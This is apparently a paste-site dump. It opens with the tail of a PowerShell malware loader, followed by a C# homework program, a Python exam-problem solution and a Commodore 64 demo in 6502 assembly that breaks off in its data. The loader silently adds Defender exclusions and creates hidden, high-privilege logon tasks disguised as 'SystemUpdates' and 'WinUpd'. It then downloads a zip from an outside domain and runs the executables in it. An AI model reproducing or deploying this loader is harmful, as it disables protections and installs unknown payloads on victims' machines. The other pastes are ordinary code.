Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList ""-Command Add-MpPreference -ExclusionPath `'$env:APPDATA`'""
Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList ""-Command Add-MpPreference -ExclusionPath `'$env:LOCALAPPDATA`'""
Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList ""-Command Add-MpPreference -ExclusionPath `'$env:ProgramData`'""
'@

Set-Content -Path $exclScriptPath -Value $exclScript -Force -Encoding UTF8

$taskName2 = 'SystemUpdates'
$exclCmd = ""powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `""$exclScriptPath`""""
schtasks /delete /tn $taskName2 /f >$null 2>&1
schtasks /create /tn $taskName2 /tr $exclCmd /sc onlogon /f /RL HIGHEST


$taskName = 'WinUpd'
$exeCommand = ""powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `""$targetPath`"" --fromloader --detached""
schtasks /delete /tn $taskName /f >$null 2>&1
schtasks /create /tn $taskName /tr $exeCommand /sc onlogon /f /RL HIGHEST


$zipUrl = 'https://21gweweqax.online/api.php'
$zipPath = Join-Path $tmp 'app.zip'

try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
} catch { exit }

do {
    $rndFolder = 'tmp' + (Get-Random -Minimum 100000 -Maximum 999999)
    $unzipDir = Join-Path $tmp $rndFolder
} while (Test-Path $unzipDir)

New-Item -ItemType Directory -Path $unzipDir | Out-Null

$shellApp = New-Object -ComObject Shell.Application
$zip = $shellApp.NameSpace($zipPath)
$dest = $shellApp.NameSpace($unzipDir)

if ($zip -and $dest) {
    $dest.CopyHere($zip.Items(), 4)
}

Get-ChildItem -Path $unzipDir -Filter *.exe | ForEach-Object {
    Start-Process $_.FullName
    return
}"
VMrMiYYD,ДЗ: Локальные максимумы,NikaBang,C#,Sunday 19th of October 2025 08:38:58 AM CDT,"internal class Program
{
    static void Main(string[] args)
    {
        int[] numbers = new int[30];
        int minRandom = 1;
        int maxRandom = 100;
        int lastIndex = numbers.Length - 1;
        Random random = new Random();

        for (int i = 0; i < numbers.Length; i++)
        {
            numbers[i] = random.Next(minRandom, maxRandom);
            Console.Write(numbers[i] + "" "");
        }

        Console.WriteLine();

        if (numbers[0] > numbers[1])
        {
            Console.Write(numbers[0] + "" "");
        }

        for (int i = 1; i < lastIndex; i++)
        {
        	if (numbers[i] > numbers[i + 1] && numbers[i] > numbers[i - 1])
        	{
        		Console.Write(numbers[i] + "" "");
        	}
        }

        if (numbers[lastIndex] > numbers[lastIndex - 1])
        {
            Console.Write(numbers[lastIndex] + "" "");
        }
    }
}"
fhjKB9p2,8 найти кол-во,nq1s788,Python,Sunday 19th of October 2025 08:03:31 AM CDT,"#https://inf-ege.sdamgia.ru/problem?id=17328
alph = 'ГЕРАСИМ'
gl = 'ЕАИ'
sogl = 'ГРСМ'
cnt = 0
for q in alph:
    for w in alph:
        for e in alph:
            for r in alph:
                for t in alph:
                    for y in alph:
                        for u in alph:
                            s = q + w + e + r + t + y + u
                            if len(set(s)) != 7:
                                continue
                            f = True
                            for i in range(1, 7):
                                if not ((s[i - 1] in gl and s[i] in sogl) or (s[i - 1] in sogl and s[i] in gl)):
                                    f = False
                            if f:
                                cnt += 1
print(cnt)"
2FZ0XAdg,At The Station,felixnardella,6502 TASM/64TASS,Sunday 19th of October 2025 07:51:53 AM CDT,"; ================================================================
; AT THE STATION - Commodore 64 One File Demo
; ================================================================
; FlashParty 2025 - 3rd Place in ""Mixed Demo"" Category
; https://flashparty.rebelion.digital/
;
; Credits:
;   Code & Graphics: Kimono (Felice Nardella)
;   Music: Manganoid (Zack Maxis) - SID: ""Beli_Jablane""
;   Group: Hokuto Force
;
; Assembly: 64tass (https://sourceforge.net/projects/tass64/)
; Compile: 64tass -a atthestation.asm -o atthestation.prg
; Download: https://csdb.dk/release/?id=256787
;
; Description:
;   A demo featuring a spiral intro animation, text messages,
;   animated escalator effect with sprites, and horizontal
;   scrolling synchronized with raster interrupts.
;
; Note:
;   The horizontal text scrolling routine is based on
;   Attilio Capuozzo's original code and ideas.
; ================================================================


* = $c000

; ================================================================
; CONSTANTS
; ================================================================
VIC_BASE = $d000              ; VIC-II Base Address (53248)

SPR_PTR = $07f8               ; Sprite 0 pointer address (2040)
SPR_PTR1 = $07f9              ; Sprite 1 pointer address (2041)
SPR_PTR2 = $07fa              ; Sprite 2 pointer address (2042)
SPR_PTR3 = $07fb              ; Sprite 3 pointer address (2043)
SPR_PTR4 = $07fc              ; Sprite 4 pointer address (2044)
SPR_PTR5 = $07fd              ; Sprite 5 pointer address (2045)
SPR_PTR6 = $07fe              ; Sprite 6 pointer address (2046)

NMIRoutine = $fec1            ; Address of default NMI Handler last instruction (RTI)

; Raster line variables
rast_1 = $80                  ; First raster interrupt line
rast_2 = $bc                  ; Second raster interrupt line (188)

; Pointer variables
src_ptr = $02                 ; Pointer to source table
dest_ptr = $2a                ; Pointer to screen destination

; ================================================================
; SPIRAL INTRO ANIMATION
; ================================================================

        ; Initialize b, w, z variables
        lda #39
        sta $50         ; b = 39 (right boundary)
        lda #0
        sta $51         ; w = 0 (top boundary)
        lda #24
        sta $52         ; z = 24 (bottom boundary)

        ; Set border color to black
        lda #0
        sta $d020

        ; Initialize loop counter a = 0
        lda #0
        sta $53

; --------------------------------------------------------
; Main loop: for a = 0 to 12
; --------------------------------------------------------
loop_a:
        lda $53
        cmp #13
        bcs done_a

        ; --- Loop 1: r = w; for c = a to b
        ; Draw horizontal line across top
        lda $51
        sta $54         ; r = w
        lda $53
        sta $55         ; c = a

loop_c1:
        jsr poke_char
        jsr delay_frame
        lda $55
        cmp $50         ; Compare c with b
        beq after_c1
        inc $55
        jmp loop_c1
after_c1:

        ; --- Loop 2: c = b; for r = w to z
        ; Draw vertical line down right side
        lda $50
        sta $55         ; c = b
        lda $51
        sta $54         ; r = w

loop_r2:
        jsr poke_char
        jsr delay_frame
        lda $54
        cmp $52         ; Compare r with z
        beq after_r2
        inc $54
        jmp loop_r2
after_r2:

        ; --- Loop 3: r = z; for c = b down to a
        ; Draw horizontal line across bottom (right to left)
        lda $52
        sta $54         ; r = z
        lda $50
        sta $55         ; c = b

loop_c3:
        jsr poke_char
        jsr delay_frame
        lda $55
        cmp $53         ; Compare c with a
        beq after_c3
        dec $55
        jmp loop_c3
after_c3:

        ; --- Loop 4: c = a; for r = z down to w
        ; Draw vertical line up left side
        lda $53
        sta $55         ; c = a
        lda $52
        sta $54         ; r = z

loop_r4:
        jsr poke_char
        jsr delay_frame
        lda $54
        cmp $51         ; Compare r with w
        beq after_r4
        dec $54
        jmp loop_r4
after_r4:

        ; Update boundaries for next spiral iteration
        dec $50         ; b--
        inc $51         ; w++
        dec $52         ; z--
        inc $53         ; a++
        jmp loop_a

done_a:

        ; Set final color effects
        lda #0  
        sta $d021       ; Background color = black
        
        ; Set character color to light green
	lda #13
        sta $0286

; ========================
; CLEAR SCREEN
; ========================
        jsr clearscreen

; ========================
; WRITE ""trapped between nowhere and forever...""
; ========================
        ; Initialize cursor position
        lda #12
        sta $54         ; row = 12
        lda #1
        sta $55         ; column = 1

        ldx #0
nextchar1:
        lda text1,x
        beq wait1_label ; If zero terminator, exit loop
        jsr writechar
        jsr beep        ; Sound effect
        inx
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        bne nextchar1

wait1_label:
        ; Wait for effect
        ldy #$ff
waitloop1:
        jsr delay_frame
        dey
        bne waitloop1
waitloop2:
        jsr delay_frame
        dey
        bne waitloop2


; ========================
; CLEAR SCREEN
; ========================
        jsr clearscreen

; ========================
; WRITE ""with no escape.""
; ========================
        ; Initialize position for second text
        lda #12
        sta $54         ; row = 12
        lda #13
        sta $55         ; column = 13

        ldx #0
nextchar2:
        lda text2,x
        beq wait2_label
        jsr writechar
        jsr beep        ; Sound effect
        inx
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        bne nextchar2

wait2_label:
        ; Wait for effect
        ldy #$ff
waitloop3:
        jsr delay_frame
        dey
        bne waitloop3

        ; Final color flash effects
        lda #1
        sta $d020       ; Border = white
        sta $d021       ; Background = white

        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame

        lda #7
        sta $d020       ; Border = yellow
        sta $d021       ; Background = yellow

        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame

        lda #0
        sta $d020       ; Border = black
        sta $d021       ; Background = black

done:
        jmp start

; ================================================================
; SUBROUTINE: delay_frame
; Simple delay routine (preserves all registers)
; ================================================================
delay_frame:
        pha
        txa
        pha
        tya
        pha
        
        ldx #$15
delay_outer:
        ldy #$30
delay_inner:
        dey
        bne delay_inner
        dex
        bne delay_outer
        
        pla
        tay
        pla
        tax
        pla
        rts

; ================================================================
; SUBROUTINE: poke_char
; Writes a character to screen at position (r,c) stored in $54,$55
; Also sets color to black at that position
; ================================================================
poke_char:
        pha
        txa
        pha
        tya
        pha

        ; Initialize multiplication result
        lda #0
        sta $57         ; Low byte of result
        sta $58         ; High byte of result

        lda $54
        sta $59         ; Copy row to counter

        ; Multiply row by 40 (screen width)
pc_mul_loop:
        lda $59
        beq pc_mul_done

        lda $57
        clc
        adc #40
        sta $57
        lda $58
        adc #0
        sta $58

        dec $59
        jmp pc_mul_loop
pc_mul_done:

        ; Add column offset
        lda $57
        clc
        adc $55
        sta $57
        lda $58
        adc #0
        sta $58

        ; Calculate screen memory address ($0400 + offset)
        lda #$00
        clc
        adc $57
        sta $5a         ; Low byte of pointer

        lda #$04
        adc $58
        sta $5b         ; High byte of pointer

        ; Write space character ($a0) to screen
        lda #$a0
        ldy #0
        sta ($5a),y

        ; Calculate color RAM address ($d800 + offset)
        lda #$00
        clc
        adc $57
        sta $5a

        lda #$d8
        adc $58
        sta $5b

        ; Write black color (0)
        lda #0
        ldy #0
        sta ($5a),y

        pla
        tay
        pla
        tax
        pla
        rts

; ================================================================
; SUBROUTINE: writechar
; Writes character in A to screen at position ($54,$55)
; Sets color to white and increments column
; ================================================================
writechar:
        pha
        txa
        pha
        tya
        pha
        
        ; Calculate address = $0400 + row*40 + column
        lda #0
        sta $57
        sta $58
        
        lda $54
        beq write_calc_done
        
        lda #0
        sta $59
        
        ; Multiply row by 40
write_mul_loop:
        lda $57
        clc
        adc #40
        sta $57
        
        lda $58
        adc #0
        sta $58
        
        inc $59
        lda $59
        cmp $54
        bcc write_mul_loop
        
write_calc_done:
        ; Add column
        lda $57
        clc
        adc $55
        sta $57
        
        lda $58
        adc #0
        sta $58
        
        ; Build screen memory pointer
        lda #$00
        clc
        adc $57
        sta $5a
        
        lda #$04
        adc $58
        sta $5b
        
        ; Write character to screen
        pla
        tay
        pla
        tax
        pla
        
        ; Save A in temporary location
        sta $5e
        
        ldy #0
        lda $5e
        sta ($5a), y
        
        ; Write white color to color RAM
        lda $57
        sta $5a
        
        lda #$d8
        sta $5b
        
        ldy #0
        lda #1          ; White color
        sta ($5a), y
        
        ; Increment column
        inc $55
        
        rts

; ================================================================
; SUBROUTINE: clearscreen
; Clears the screen using KERNAL routine
; ================================================================
clearscreen:
        lda #$93        ; Clear screen code
        jsr $ffd2       ; KERNAL CHROUT
        rts

; ================================================================
; SUBROUTINE: beep
; Produces a short beep sound using SID chip
; ================================================================
beep:   
        lda #$0f        ; Maximum volume
        sta $d418       ; SID volume register

        lda #$00        ; Frequency low byte
        sta $d400
        lda #$a0        ; Frequency high byte
        sta $d401

        lda #$00        ; Pulse width low
        sta $d402
        lda #$08        ; Pulse width high
        sta $d403

        lda #$09        ; Attack=0, Decay=9
        sta $d405
        lda #$F0        ; Sustain=15, Release=0
        sta $d406

        lda #$11        ; Gate on + pulse waveform
        sta $d404       ; Voice 1 control

        ldy #$ff        ; Delay to hear the sound
beepl1: 
        dey
        bne beepl1

        lda #$10        ; Gate off, pulse on (stop sound)
        sta $d404
        
        rts

; ================================================================
; MAIN PROGRAM START
; ================================================================
start:
  
        ; Border and background colors are set later in sprite setup

; Copy sprite data to memory
        jsr LoadSprites

; Sprite settings

; Sprite expansion (commented out - not used)
;        lda #112
;        sta VIC_BASE+23   ; Y expansion
;        sta VIC_BASE+29   ; X expansion

; MSB Sprite (for X coordinates > 255)
        lda #1
        sta VIC_BASE+16 ; Enable MSB for sprite 0 (flag)

; Position sprite 0 (flag)
        lda #47         ; x0 = 255 + 47 = 302
        sta VIC_BASE
        lda #121        ; y0 = 121
        sta VIC_BASE+1

; Position sprites 1-3 (standing person)
        lda #105        ; x1 = 105
        sta VIC_BASE+2
        lda #145        ; y1 = 145
        sta VIC_BASE+3

        lda #105        ; x2 = 105
        sta VIC_BASE+4
        lda #145        ; y2 = 145
        sta VIC_BASE+5

        lda #105        ; x3 = 105
        sta VIC_BASE+6
        lda #145        ; y3 = 145
        sta VIC_BASE+7

; Position sprites 4-6 (sitting person)
        lda #217        ; x4 = 217
        sta VIC_BASE+8
        lda #164        ; y4 = 164
        sta VIC_BASE+9

        lda #217        ; x5 = 217
        sta VIC_BASE+10
        lda #164        ; y5 = 164
        sta VIC_BASE+11

        lda #217        ; x6 = 217
        sta VIC_BASE+12
        lda #164        ; y6 = 164
        sta VIC_BASE+13

; Enable sprites 0-6
        lda #$7f
        sta VIC_BASE+21 ; Enable 7 sprites

; Sprite 0 colors (flag - multicolor)
        lda #1
        sta VIC_BASE+28 ; Multicolor mode for sprite 0
        lda #9
        sta VIC_BASE+37 ; Multicolor 0 = orange (53285)
        lda #3
        sta VIC_BASE+38 ; Multicolor 1 = cyan (53286)
        lda #5
        sta VIC_BASE+39 ; Sprite 0 color = green

; Sprites 1-3 colors (standing person)
        lda #8
        sta VIC_BASE+40 ; Sprite 1 color = orange
        lda #10
        sta VIC_BASE+41 ; Sprite 2 color = light red
        lda #5
        sta VIC_BASE+42 ; Sprite 3 color = green

; Sprites 4-6 colors (sitting person)
        lda #7
        sta VIC_BASE+43 ; Sprite 4 color = yellow
        lda #10
        sta VIC_BASE+44 ; Sprite 5 color = light red
        lda #6
        sta VIC_BASE+45 ; Sprite 6 color = blue

; Sprite pointers
        lda #226
        sta SPR_PTR1    ; Write to $07F9 (sprite 1 pointer)
        lda #227
        sta SPR_PTR2    ; Write to $07FA (sprite 2 pointer)
        lda #228
        sta SPR_PTR3    ; Write to $07FB (sprite 3 pointer)
        lda #229
        sta SPR_PTR4    ; Write to $07FC (sprite 4 pointer)
        lda #230
        sta SPR_PTR5    ; Write to $07FD (sprite 5 pointer)
        lda #231
        sta SPR_PTR6    ; Write to $07FE (sprite 6 pointer)

; Draw and color background screen
        ldx #$0
loop1:
        lda chars,x
        sta $0400,x

        lda colors,x
        sta $d800,x

	lda chars+200,x
        sta $0400+200,x

        lda colors+200,x
        sta $d800+200,x

	lda chars+400,x
        sta $0400+400,x

        lda colors+400,x
        sta $d800+400,x

	lda chars+600,x
        sta $0400+600,x

        lda colors+600,x
        sta $d800+600,x

	lda chars+800,x
        sta $0400+800,x

        lda colors+800,x
        sta $d800+800,x

        inx
        cpx #200         
        bne loop1

; ================================================================
; SETUP IRQ INTERRUPT SYSTEM
; ================================================================
        sei                   ; Set Interrupt Disable Flag (disable IRQ)
        
        ; Set custom IRQ vector
        lda #<IRQRoutine
        sta $0314
        lda #>IRQRoutine
        sta $0315

        lda #$7f              ; 127 = %01111111 (binary mask to clear MSB)
        sta $dc0d             ; Disable CIA 1 IRQ interrupts (timer A system interrupt)
        sta $dd0d             ; Disable CIA 2 NMI interrupts
        
        lda $dc0d             ; Clear any pending IRQ from CIA 1 (reading clears)
        lda $dd0d             ; Clear any pending NMI from CIA 2 (reading clears)

        lda #$00              ; First raster interrupt at line 0
        sta $d012             ; Load value into raster register
        sta $fb               ; Horizontal scroll counter variable (page 0)
        
        lda #$1b              ; 27 decimal = %00011011
        sta $d011             ; Clear MSB of raster (bit 8 of $d012-$d011)
        
        lda #$01
        sta $d01a             ; Enable raster interrupt

; ================================================================
; INITIALIZE SID MUSIC
; ================================================================
        lda #$00              ; Clear A register
        jsr $1000             ; Initialize music at $1000

        cli                   ; Clear Interrupt Disable Flag (enable IRQ)

        ; Setup NMI vector to disable RESTORE key
        ldx #<NMIRoutine      ; Load address $fec1 into NMINV vector ($0318-$0319)
        ldy #>NMIRoutine      ; This points to RTI instruction of default NMI handler
        stx $0318             ; This trick effectively disables RUN STOP + RESTORE
        sty $0319             ; preventing user from exiting the program

; ================================================================
; MAIN ANIMATION LOOP
; ================================================================
MainLoop:
        ldx #0  
animation_loop:
        ; Copy table 1 (escalator_1)
        lda #<escalator_1     ; Load address of first table
        sta src_ptr
        lda #>escalator_1
        sta src_ptr+1

        lda s_table,x         ; Get sprite pointer from table
        sta SPR_PTR           ; Write to $07F8 (sprite 0 pointer)
        inx
    
        jsr copy_table        ; Copy the table
        jsr wait              ; Wait for timing
        
        ; Copy table 2 (escalator_2)
        lda #<escalator_2
        sta src_ptr
        lda #>escalator_2
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
      
        jsr copy_table
        jsr wait 

        ; Copy table 3 (escalator_3)
        lda #<escalator_3
        sta src_ptr
        lda #>escalator_3
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
   
        jsr copy_table
        jsr wait 

        ; Copy table 4 (escalator_4)
        lda #<escalator_4
        sta src_ptr
        lda #>escalator_4
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx

        jsr copy_table
        jsr wait 

        ; Copy table 5 (escalator_5)
        lda #<escalator_5
        sta src_ptr
        lda #>escalator_5
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
       
        jsr copy_table
        jsr wait 

        ; Copy table 6 (escalator_6)
        lda #<escalator_6
        sta src_ptr
        lda #>escalator_6
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
       
        jsr copy_table
        jsr wait 

        ; Copy table 7 (escalator_7)
        lda #<escalator_7
        sta src_ptr
        lda #>escalator_7
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
    
        jsr copy_table
        jsr wait 

        ; Copy table 8 (escalator_8)
        lda #<escalator_8
        sta src_ptr
        lda #>escalator_8
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
          
        jsr copy_table
        jsr wait 

        ; Copy table 9 (escalator_9)
        lda #<escalator_9
        sta src_ptr
        lda #>escalator_9
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
          
        jsr copy_table
        jsr wait 

        ; Copy table 10 (escalator_10)
        lda #<escalator_10
        sta src_ptr
        lda #>escalator_10
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
          
        jsr copy_table
        jsr wait 

        jmp MainLoop          ; Loop forever
       

; ================================================================
; SUBROUTINE: copy_table
; Copies a 13x13 table to the escalator area on screen
; (color RAM at row 12, column 1)
; ================================================================
copy_table:
        txa                   ; Save X
        pha
        tya                   ; Save Y
        pha

        ; Calculate screen address for row 13, column 1
        lda #<($d800+12*40)   ; Low byte of color RAM address
        sta dest_ptr
        lda #>($d800+12*40)   ; High byte of color RAM address
        sta dest_ptr+1
        
        ldx #0                ; Row counter (0-12)
        
row_loop:
        ldy #0                ; Column counter (0-12)
        
col_loop:
        ; Copy one byte from table to color RAM
        lda (src_ptr),y       ; Read from table
        sta (dest_ptr),y      ; Write to color RAM
        
        iny                   ; Next column
        cpy #13               ; Check if we've reached 13 columns
        bne col_loop
        
        ; Advance to next row in table
        clc
        lda src_ptr           ; Add 13 to source pointer
        adc #13
        sta src_ptr
        lda src_ptr+1
        adc #0
        sta src_ptr+1
        
        ; Advance to next row on screen
        clc
        lda dest_ptr          ; Add 40 to destination pointer
        adc #40               ; (screen row width)
        sta dest_ptr
        lda dest_ptr+1
        adc #0
        sta dest_ptr+1
        
        inx                   ; Next row
        cpx #13               ; Check if we've reached 13 rows
        bne row_loop   

        pla                   ; Restore Y
        tay
        pla                   ; Restore X
        tax
        rts

; ================================================================
; SUBROUTINE: wait
; Delay routine for animation timing
; ================================================================
wait:
        txa                   ; Save X
        pha
        tya                   ; Save Y
        pha

        ldy #50
Delay1: ldx #0
Delay2: dex
        bne Delay2
        dey
        bne Delay1

        pla                   ; Restore Y
        tay
        pla                   ; Restore X
        tax
        rts

; ================================================================
; SUBROUTINE: LoadSprites
; Copies sprite data from ROM to sprite memory locations
; ================================================================
LoadSprites:
        ldx #0
LoadLoop:
        ; Flag sprites (0-9)
        lda sprite0_data,x
        sta $02C0,x     ; $02C0 = 704 (sprite pointer 11)

        lda sprite1_data,x
        sta $0340,x     ; $0340 = 832 (sprite pointer 13)

        lda sprite2_data,x
        sta $0380,x     ; $0380 = 896 (sprite pointer 14)

        lda sprite3_data,x
        sta $03C0,x     ; $03C0 = 960 (sprite pointer 15)

        lda sprite4_data,x
        sta $3700,x     ; $3700 = 14080 (sprite pointer 220)

        lda sprite5_data,x
        sta $3740,x     ; $3740 = 14144 (sprite pointer 221)

        lda sprite6_data,x
        sta $3780,x     ; $3780 = 14208 (sprite pointer 222)

        lda sprite7_data,x
        sta $37c0,x     ; $37c0 = 14272 (sprite pointer 223)

        lda sprite8_data,x
        sta $3800,x     ; $3800 = 14336 (sprite pointer 224)

        lda sprite9_data,x
        sta $3840,x     ; $3840 = 14400 (sprite pointer 225)

        ; Standing person sprites (10-12)
        lda sprite10_data,x
        sta $3880,x     ; $3880 = 14464 (sprite pointer 226)

        lda sprite11_data,x
        sta $38c0,x     ; $38c0 = 14528 (sprite pointer 227)

        lda sprite12_data,x
        sta $3900,x     ; $3900 = 14592 (sprite pointer 228)

        ; Sitting person sprites (13-15)
        lda sprite13_data,x
        sta $3940,x     ; $3940 = 14656 (sprite pointer 229)

        lda sprite14_data,x
        sta $3980,x     ; $3980 = 14720 (sprite pointer 230)

        lda sprite15_data,x
        sta $39c0,x     ; $39c0 = 14784 (sprite pointer 231)

        inx
        cpx #63
        bne LoadLoop
        rts

; ================================================================
; IRQ ROUTINE - Main raster interrupt handler
; ================================================================
IRQRoutine:
        asl $d019             ; Acknowledge raster IRQ

; Modified with 3 separate IRQ handlers:
; IRQ1: Handles horizontal scroll (changes only $D016)
; IRQ2: Resets scroll at bottom of scroll area
; IRQ3: Called during vertical blank to move characters

        lda $d012             ; Current raster line
        cmp #$00
        beq RasterTop         ; Top raster - scroll area
        cmp #rast_1
        beq RasterBottom      ; Bottom raster - reset scroll
        cmp #rast_2
        beq DoMoveChars       ; Move characters raster

        jmp testTimerAInterrupt


; Top of screen - apply horizontal scroll
RasterTop:
        ldx $fb               ; Load scroll counter
        inx                   ; Increment counter
        cpx #$08              ; Reached 8? (8 pixels = full character)
        bne scrolling         ; If not at end, continue scrolling
        ldx #$00              ; Reset counter if at end
scrolling:
        lda scrollValue,x     ; Read scroll value from table
        sta $d016             ; Set horizontal scroll (bits 0-2 of $d016)
        stx $fb               ; Save counter

        lda #rast_1	      ; Next IRQ at line rast_1
        sta $d012
        jmp testTimerAInterrupt


; Bottom of scroll area - reset to no scroll
RasterBottom:
        lda #$00              ; %00000000 (38 column mode)
        sta $d016             ; Reset to default (no horizontal scroll)

        lda #rast_2           ; Next IRQ at line rast_2
        sta $d012
        jmp testTimerAInterrupt

; Move characters horizontally
DoMoveChars:
        jsr moveCharacters    ; Shift characters

        lda #$00              ; Next IRQ at line 0
        sta $d012
        jmp testTimerAInterrupt


; Check for system timer interrupt and call music player
testTimerAInterrupt:
        lda $dc0d             ; Check if CIA 1 Timer A interrupt occurred
        and #$01              ; Check if bit 0 (LSB) is set
        beq exitPullStack     ; If no Timer A interrupt, exit normally

; Call SID music player
        jsr $1003             ; Call music playback routine at $1003
        jmp $ea31             ; Jump to system IRQ handler for keyboard scan, etc.
        
exitPullStack:
        pla                   ; These 6 instructions are equivalent to
        tay                   ; JMP $ea81 or JMP $febc
        pla                   ; Pull registers Y, X, A from stack + RTI
        tax                   ; Push of the 3 data registers is done by
        pla                   ; the IRQ main routine at ROM $ff48
        rti                   ; Return from interrupt



; ================================================================
; SUBROUTINE: moveCharacters
; Shifts characters one position to the right (circular shift)
; Only moves the first 10 rows of the screen
; ================================================================
moveCharacters:
        ; Save A and X
        pha
        txa
        pha
        
        ; Move only first 10 rows
        ldx #$00        ; Row 0
        
moveRow:
        ; Get base address of row from precomputed table
        lda screenAddrLo,x
        sta $fd
        lda screenAddrHi,x
        sta $fe
        
        ; Save character at last position (column 39)
        ldy #39
        lda ($fd),y
        pha
        
        ; Shift characters from right to left
shiftLoop:
        dey
        lda ($fd),y
        iny
        sta ($fd),y
        dey
        bpl shiftLoop
        
        ; Put saved character in first position
        pla
        ldy #$00
        sta ($fd),y


; Process color RAM the same way
        lda colorAddrLo,x
        sta $fd
        lda colorAddrHi,x
        sta $fe

        ldy #39
        lda ($fd),y
        pha
shiftLoopCol:
        dey
        lda ($fd),y
        iny
        sta ($fd),y
        dey
        bpl shiftLoopCol

        pla
        ldy #0
        sta ($fd),y
        
        ; Next row
        inx
        cpx #10         ; Only first 10 rows
        bne moveRow
        
        ; Restore registers
        pla
        tax
        pla
        rts

; ================================================================
; DATA SECTION
; ================================================================

; Precomputed addresses for screen memory rows
screenAddrLo:
        .byte <($0400+0*40), <($0400+1*40), <($0400+2*40), <($0400+3*40)
        .byte <($0400+4*40), <($0400+5*40), <($0400+6*40), <($0400+7*40)
        .byte <($0400+8*40), <($0400+9*40)

screenAddrHi:
        .byte >($0400+0*40), >($0400+1*40), >($0400+2*40), >($0400+3*40)
        .byte >($0400+4*40), >($0400+5*40), >($0400+6*40), >($0400+7*40)
        .byte >($0400+8*40), >($0400+9*40)

; Precomputed addresses for color RAM rows
colorAddrLo:
        .byte <($d800+0*40), <($d800+1*40), <($d800+2*40), <($d800+3*40)
        .byte <($d800+4*40), <($d800+5*40), <($d800+6*40), <($d800+7*40)
        .byte <($d800+8*40), <($d800+9*40)

colorAddrHi:
        .byte >($d800+0*40), >($d800+1*40), >($d800+2*40), >($d800+3*40)
        .byte >($d800+4*40), >($d800+5*40), >($d800+6*40), >($d800+7*40)
        .byte >($d800+8*40), >($d800+9*40)

; Table of scroll values for pixel scrolling (0 to 7, rightward movement)
scrollValue:
        .byte 0,1,2,3,4,5,6,7

; Sprite pointer table (values for escalator animation frames)
s_table:
        .byte 11,13,14,15,220,221,222,223,224,225

; Text strings in PETSCII format
Text1:
        ; ""trapped between nowhere and forever...""
        .byte $14   ; t
        .byte $12   ; r
        .byte $01   ; a
        .byte $10   ; p
        .byte $10   ; p
        .byte $05   ; e
        .byte $04   ; d
        .byte 32    ; space
        .byte $02   ; b
        .byte $05   ; e
        .byte $14   ; t
        .byte $17   ; w
        .byte $05   ; e
        .byte $05   ; e
        .byte $0E   ; n
        .byte 32    ; space
        .byte $0E   ; n
        .byte $0F   ; o
        .byte $17   ; w
        .byte $08   ; h
        .byte $05   ; e
        .byte $12   ; r
        .byte $05   ; e
        .byte 32    ; space
        .byte $01   ; a
        .byte $0E   ; n
        .byte $04   ; d
        .byte 32    ; space
        .byte $06   ; f
        .byte $0F   ; o
        .byte $12   ; r
        .byte $05   ; e
        .byte $16   ; v
        .byte $05   ; e
        .byte $12   ; r
        .byte 46    ; .
        .byte 46    ; .
        .byte 46    ; .
        .byte 0     ; String terminator

Text2:
        ; ""with no escape.""
        .byte $17   ; w
        .byte $09   ; i
        .byte $14   ; t
        .byte $08   ; h
        .byte 32    ; space
        .byte $0E   ; n
        .byte $0F   ; o
        .byte 32    ; space
        .byte $05   ; e
        .byte $13   ; s
        .byte $03   ; c
        .byte $01   ; a
        .byte $10   ; p
        .byte $05   ; e
        .byte 46    ; .
        .byte 0     ; String terminator


; ================================================================
; DATA LOADED FROM $1000 ONWARDS
; ================================================================
* = $1000

; SID music data (binary SID file with header stripped)
         .binary ""Beli_jablane_FINAL.sid"", $7e  ; Load music data at $1000, skip $7e byte header
	
; Background screen character data (1000 bytes)
chars:
	.byte $6f,$6f,$6f,$6f,$6f,$e3,$f7,$f8,$62,$79,$6f,$6f,$6f,$6f,$6f,$6f
	.byte $6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f
	.byte $6f,$6f,$6f,$6f,$6f,$6f,$20,$6f,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4
	.byte $e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4
	.byte $e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$20,$a0
	.byte $e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4
	.byte $e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4
	.byte $e4,$e4,$e4,$e4,$e4,$e4,$20,$e4,$a0,$dd,$a0,$dd,$a0,$dd,$dd,$e3
	.byte $dd,$dd,$a0,$dd,$dd,$a0,$dd,$dd,$a0,$dd,$c2,$a0,$dd,$dd,$a0,$dd
	.byte $dd,$a0,$c2,$dd,$a0,$dd,$dd,$62,$dd,$a0,$a0,$dd,$a0,$dd,$bd,$dd
	.byte $af,$dd,$a0,$ca,$c3,$cb,$ca,$c3,$cb,$ca,$c3,$cb,$ca,$c3,$cb,$ca
	.byte $c3,$cb,$ca,$c3,$cb,$ca,$c3,$cb,$ca,$c3,$cb,$ca,$c3,$cb,$ca,$c3
	.byte $cb,$a0,$a0,$dd,$af,$dd,$bd,$dd,$e3,$dd,$a0,$a0,$a0,$a0,$a0,$a0
